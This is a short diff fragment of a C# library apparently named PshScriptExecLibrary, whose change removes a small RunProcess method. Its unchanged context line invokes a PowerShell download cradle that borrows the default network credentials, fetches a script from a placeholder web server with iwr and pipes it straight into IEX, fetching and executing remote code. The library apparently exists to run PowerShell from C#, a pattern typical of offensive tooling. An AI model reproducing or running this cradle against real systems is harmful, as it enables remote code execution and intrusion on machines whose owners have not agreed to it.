@@ -37,10 +37,6 @@ namespace PshScriptExecLibrary {
                s.Invoke("(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<webserver>/<path_to_script>.ps1')|IEX");
                r.Close();
            }
-    
-           public void RunProcess(string path) {
-               Process.Start(path);
-           }
      }
 }
 ```
